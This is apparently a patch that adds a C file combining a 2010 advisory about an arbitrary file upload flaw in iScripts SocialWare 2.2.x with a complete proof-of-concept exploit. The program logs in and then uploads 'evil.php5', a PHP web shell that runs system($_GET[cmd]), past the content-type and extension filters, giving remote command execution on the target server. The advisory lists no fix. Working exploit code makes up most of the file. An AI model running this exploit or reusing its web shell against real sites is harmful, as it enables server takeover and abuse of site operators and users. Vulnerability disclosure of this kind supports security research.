@@ -1,0 +1,449 @@
+/*iScripts SocialWare 2.2.x Arbitrary File Upload Vulnerability
+
+ Name              iScripts SocialWare
+ Vendor            http://www.iscripts.com
+ Versions Affected 2.2.x
+
+ Author            Salvatore Fresta aka Drosophila
+ Website           http://www.salvatorefresta.net
+ Contact           salvatorefresta [at] gmail [dot] com
+ Date              2010-02-07
+
+X. INDEX
+
+ I.    ABOUT THE APPLICATION
+ II.   DESCRIPTION
+ III.  ANALYSIS
+ IV.   SAMPLE CODE
+ V.    FIX
+ 
+
+I. ABOUT THE APPLICATION
+
+iScripts  SocialWare  is  an  award-winning,  easy to use
+social  networking  software  that  enables you to create
+your  own social network like MySpace, Orkut, Friendster,
+Linkedin, Facebook, Hi5, etc.
+
+
+II. DESCRIPTION
+
+The arbitrary file upload is possible  due  to two filters
+bypassing.
+
+
+III. ANALYSIS
+
+Summary:
+
+ A) Arbitrary File Upload
+ 
+
+A) Arbitrary File Upload
+
+photos.php  is  affected  by  an  arbitrary   file  upload
+vulnerability. In this script, for each upload, two checks
+are executed: one on the content-type and one on the  file
+extension.  The  content-type  can  be  bypassed  using  a
+crafted HTTP packet.  The  file  extension  filter  can be
+bypassed using the php5 extension instead of php extension.
+
+The malicious  file  will  be   renamed   and   copied  in
+member_photos  directory,  that  sometimes   has   a   777
+permission.
+Using  this vulnerability a user can execute arbitrary php
+code.
+
+
+IV. SAMPLE CODE
+
+A) Arbitrary File Upload
+
+http://www.salvatorefresta.net/files/poc/PoC-iScriptsSW22.c */
+
+/*
+
+	Poc Remote Shell Upload - iScripts SocialWare 2.2.x 
+	
+	Author: Salvatore Fresta aka Drosophila
+	E-mail: salvatorefresta@gmail.com
+	
+	Date: 02 July 2010
+	
+	This Proof of Concept will upload a simple php shell (evil.php5)
+	in member_photos.
+	
+	Compile on Unix-like systems: gcc PoC-FC213.c -o PoC-FC213	
+	Compile on Microsoft Windows: gcc PoC-FC213.c -lws2_32 -o PoC-FC213
+	
+	./PoC-FC213 --host hostname --path /path/ -u username -p password
+
+	[*] Connecting...
+	[+] Connected
+	[*] Login...
+	[+] Login Successful
+	[*] Uploading...
+	[+] Shell uploaded
+	[+] Connection closed
+
+*/	
+
+#include <string.h>
+#include <stdlib.h>
+#include <stdio.h>
+#include <stdarg.h>
+#include <getopt.h>
+#ifdef WIN32
+    #include <winsock.h>
+    #define close closesocket
+#else
+	#include <sys/types.h>
+	#include <sys/socket.h>
+	#include <netinet/in.h>
+	#include <unistd.h>
+	#include <errno.h>
+	#include <netdb.h>
+#endif
+
+int vspr(char **buff, char *fmt, ...) {
+	
+    va_list ap;
+    int     len,
+            mlen;
+    char    *ret = NULL;
+
+    mlen = strlen(fmt) + 128;
+    va_start(ap, fmt);
+    
+    while(1) {
+    	
+        ret = (char *) malloc(mlen);
+        if(!ret) return -1;
+        
+        len = vsnprintf(ret, mlen, fmt, ap);
+        
+        if((len >= 0) && (len < mlen)) break;
+        
+        mlen = len < 0 ? mlen+128 : len+1;
+        
+        free(ret);
+        
+    }
+    
+    va_end(ap);
+
+    *buff = ret;
+    
+    return len;
+    
+}
+
+int socket_connect(char *server, int port) {
+
+	int fd;
+	struct sockaddr_in sock;
+	struct hostent *host;
+	
+#ifdef WIN32	
+	WSADATA wsadata;
+    if(WSAStartup(MAKEWORD(1,0), &wsadata)) return -1;
+#endif
+	
+	memset(&sock, 0, sizeof(sock));
+	
+	if((fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) return -1;
+	
+	sock.sin_family = AF_INET;
+	sock.sin_port = htons(port);
+	
+	if(!(host=gethostbyname(server))) return -1;
+	
+	sock.sin_addr = *((struct in_addr *)host->h_addr);
+	
+	if(connect(fd, (struct sockaddr *) &sock, sizeof(sock)) < 0) return -1;
+	
+	return fd;
+   
+}
+
+char *socket_receive(int sock, int tout) {
+
+	int ret,
+	    byte,
+	    oldpkglen = 0,
+	    pkglen = 0;
+	char *buffer = NULL, 
+	     tmp[128];
+	struct timeval timeout;
+	fd_set input;
+	
+	if(sock < 0) return NULL;
+	
+	while (1) {
+		
+		FD_ZERO(&input);
+		FD_SET(sock, &input);
+		
+		if(tout > 0) {
+			timeout.tv_sec  = tout;
+			timeout.tv_usec = 0;
+			ret = select(sock + 1, &input, NULL, NULL, &timeout);
+		}
+		else
+			ret = select(sock + 1, &input, NULL, NULL, NULL);
+	
+		if (!ret) break;
+		if (ret < 0) return NULL;
+		
+		byte = recv(sock, tmp, sizeof(tmp), 0);
+		
+		if(byte < 0) return NULL;
+		
+		if(!byte) break;
+		
+		oldpkglen = pkglen;
+		pkglen += byte;
+		
+		buffer = (char *) realloc(buffer, pkglen+1);
+		
+		if(!buffer) return NULL;
+		
+		memcpy(buffer+oldpkglen, tmp, byte);
+	
+	}
+	
+	if(buffer) buffer[pkglen] = 0;
+	
+	return buffer;
+   
+}
+
+void usage(char *cmd) {
+
+	printf("\nPoC Remote Shell Upload - iScripts SocialWare 2.2.x\n"
+	       "Written by Salvatore Fresta\n\n"
+		   "usage: %s [options]\n"
+		   "\n"
+		   "Required options:\n"
+		   "\n"
+		   "\t--host     : Target hostname\n"
+		   "\t--port     : Remote TCP Port (default 80)\n"
+		   "\t--path     : Webserver path (ex: /path/ or /)\n"
+		   "\t--username : Registered username\n"
+		   "\t--password : Password for username\n\n"
+		   "Example: %s --host localhost --path /path/ -u mario@mail.net -p rossi\n\n", cmd, cmd);	
+
+}
+
+int main(int argc, char *argv[]) {
+	
+	int sd,
+	    option,
+	    optidx,
+	    port = 80,
+	    clen,
+	    pkglen;
+	char *buffer  = NULL,
+		 *rec     = NULL,
+		 *session = NULL,
+		 *host    = NULL,
+		 *path    = NULL,
+		 *user    = NULL,
+		 *passwd  = NULL,
+		 code[] = "--AaB03x\r\n"
+				  "Content-Disposition: form-data; name=\"photo\"; filename=\"evil.php5\"\r\n"
+				  "Content-Type: image/jpeg\r\n"
+			      "\r\n"
+				  "<?php echo \"<pre>\"; system($_GET[cmd]); echo \"</pre>\"?>\r\n"
+				  "--AaB03x\r\n"
+				  
+				  "Content-Disposition: form-data; name=\"Call\"\r\n"
+				  "\r\n"
+				  "add\r\n"
+				  "--AaB03x\r\n"
+				  
+				  "Content-Disposition: form-data; name=\"photoType\"\r\n"
+				  "\r\n"
+				  "P\r\n"
+				  "--AaB03x\r\n"
+				  
+				  "Content-Disposition: form-data; name=\"image.x\"\r\n"
+				  "\r\n"
+				  "8\r\n"
+				  "--AaB03x\r\n"
+				  
+				  "Content-Disposition: form-data; name=\"image.y\"\r\n"
+				  "\r\n"
+				  "5\r\n"
+				  "--AaB03x--\r\n";
+		
+	struct option long_options[] = {
+		{"host",         1, 0,  1 },
+        {"port",         1, 0,  2 },
+		{"path",         1, 0,  3 },
+        {"username",     1, 0, 'u'},
+        {"password",     1, 0, 'p'},
+        {NULL,           0, 0,  0 },
+	};
+		
+	if(argc < 2) {
+		usage(argv[0]);
+		return -1;
+	}
+	
+	while((option = getopt_long(argc, argv, "u:p:", long_options, &optidx)) > 0) {
+
+		switch(option) {
+			
+			case 1:
+				host = optarg;
+			break;
+			
+			case 2:
+				port = atoi(optarg);
+			break;
+			
+			case 3:
+				path = optarg;
+			break;
+			
+			case 'u':
+				user = optarg;
+			break;
+			
+			case 'p':
+				passwd = optarg;
+			break;
+			
+			default:
+				usage(argv[0]);
+				return -1;
+			break;
+			
+		}
+		
+	}
+	
+	if(!host || !path || !user || !passwd || port < 0) {
+		usage(argv[0]);
+		return -1;
+	}
+					
+	printf("\n[*] Connecting...\n");
+	
+	if((sd = socket_connect(host, port)) < 0) {
+		printf("[-] Connection failed!\n\n");
+		free(buffer);
+		return -1;
+	}
+	
+	printf("[+] Connected"
+	       "\n[*] Login...");
+	
+	clen = strlen(user)+strlen(passwd)+16;
+	
+	pkglen = vspr(&buffer, "POST %scheck_login.php HTTP/1.1\r\n"
+	                       "Host: %s\r\n"
+	                       "Content-Type: application/x-www-form-urlencoded\r\n"
+	                       "Content-Length: %d\r\n"
+	                       "\r\n"
+	                       "email=%s&password=%s", path, host, clen, user, passwd);
+	
+	if(send(sd, buffer, pkglen, 0) < 0) {
+		printf("[-] Sending failed!\n\n");
+		free(buffer);
+		close(sd);
+		return -1;
+	}
+	
+	if(!(rec = socket_receive(sd, 0))) {
+		printf("[-] Receive failed!\n\n");
+		free(buffer);
+		close(sd);
+		return -1;
+	}
+	
+	if(strstr(rec, "Password is invalid")) {
+		printf("\n[-] Login Incorrect!\n\n");
+		free(buffer);
+		close(sd);
+		return -1;
+	}
+	
+	session = strstr(rec, "PHPSESSID");
+	
+	if(!session) {
+		printf("\n[-] Session error!\n\n");
+		free(buffer);
+		close(sd);
+		return -1;
+	}
+	
+	session = strtok(session, ";");
+	
+	if(!session) {
+		printf("\n[-] Session error!\n\n");
+		free(buffer);
+		close(sd);
+		return -1;
+	}
+
+	printf("\n[+] Login Successful"
+			"\n[*] Uploading...\n");
+	
+	close(sd);
+	if((sd = socket_connect(host, port)) < 0) {
+		printf("[-] Connection failed!\n\n");
+		free(buffer);
+		return -1;
+	}
+			
+	free(buffer);
+	clen = strlen(code);
+	
+	pkglen = vspr(&buffer, "POST %spopups/photos.php HTTP/1.1\r\n"
+					       "Host: %s\r\n"
+					       "Cookie: %s\r\n"
+					       "Content-type: multipart/form-data, boundary=AaB03x\r\n"
+					       "Content-Length: %d\r\n"
+					       "\r\n"
+					       "%s", path, host, session, clen, code);
+	
+	if(send(sd, buffer, pkglen, 0) < 0) {
+		printf("[-] Sending failed!\n\n");
+		free(buffer);
+		close(sd);
+		return -1;
+	}
+	
+	if(!(rec = socket_receive(sd, 3))) {
+		printf("[-] Receive failed!\n\n");
+		free(buffer);
+		close(sd);
+		return -1;
+	}
+	
+	if(!strstr(rec, "evil.php5")) {
+		printf("\n[-] Upload failed!\n\n");
+		free(buffer);
+		close(sd);
+		return -1;
+	}
+	
+	free(buffer);
+	close(sd);
+	
+	printf("[+] Shell uploaded"
+			"\n[+] Connection closed\n\n");
+	
+	return 0;
+	
+}
+
+/*
+
+V. FIX
+
+No Fix.
+
+*/
